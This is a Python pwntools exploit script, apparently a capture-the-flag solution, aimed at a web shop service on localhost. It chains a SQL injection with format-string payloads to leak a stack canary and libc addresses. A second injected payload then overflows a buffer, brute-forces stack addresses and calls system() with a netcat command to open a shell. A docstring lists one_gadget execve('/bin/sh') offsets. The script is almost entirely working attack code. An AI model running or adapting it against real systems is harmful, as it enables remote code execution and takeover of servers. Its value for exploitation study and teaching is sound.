#!/usr/bin/env python
# encoding: utf-8

from pwn import *
import requests


def get_stack(host, port):
	url = "http://%s:%d/cart.html" % (host, port)
	data = '''1=2&cargo=0) union select repeat(unhex('257020'),128)#&'''
	content = requests.post(url, data=data).content
	leak = content.split("</html>")[1].split(" ")
	print leak
	result = []
	for i in leak:
		if i == "":
			continue
		if i == "(nil)":
			result.append(0)
		else:
			result.append(int(i, 16))
	return result


def reverse(cannary, system_addr,host, port, reverse_host, reverse_port):
	# command_addr = p64(0x63e3c0+120+8*7).encode("hex")
	for i in range(0x7fffffffdbb0, 0x7fffffffffff, 8):
		print "%016x" % (i)
		command_addr = i
		url = "http://%s:%d/product.html" % (host, port)
		data = "a=b&id=0 union select concat('overduee','nc 127.0.0.1 1337  #',repeat('A', 92),unhex('%s'),repeat(unhex('0000000000000000'),3),unhex('%s'),repeat(unhex('%s'),2)),1 from cargo&c=d" % (
			p64(cannary).encode("hex"), p64(system_addr).encode("hex"), p64(command_addr).encode("hex"), # reverse_host, reverse_port
		)
		print 'curl -X POST "%s" -d "%s"' % (url, data)
		requests.post(url, data=data)
		# print response.content


def exploit(host, port):
	'''
	0x45216 execve("/bin/sh", rsp+0x30, environ)   
	constraints:                                   
	  rax == NULL                                  
	                                               
	0x4526a execve("/bin/sh", rsp+0x30, environ)   
	constraints:                                   
	  [rsp+0x30] == NULL                           
	                                               
	0xf02a4 execve("/bin/sh", rsp+0x50, environ)   
	constraints:                                   
	  [rsp+0x50] == NULL                           
	                                               
	0xf1147 execve("/bin/sh", rsp+0x70, environ)   
	constraints:                                   
	  [rsp+0x70] == NULL                           
	'''
	one_gadget_addr = 0x4526a
	stack = get_stack(host, port)
	# f015ca0b696dfa00
	cannary = stack[40]
	# cannary = 0x0000EEEEEEEEEEEE
	print "[+] cannary: 0x%016x" % (cannary)
	# 7f2636366000-7f26364d7000
	libc_addr = stack[74] - 8347-0x22000
	# libc_addr = 0x0000FFFFFFFFFFFF
	print "[+] libc: 0x%016x" % (libc_addr)
	system_offset = 0x0000000000050300
	system_addr = libc_addr + system_offset
	# system_addr = 0x0000AAAAAAAAAAAA
	print "[+] system: 0x%016x" % (system_addr)
	reverse(cannary, system_addr, host, port, "0", 1337)


exploit("127.0.0.1", 8080)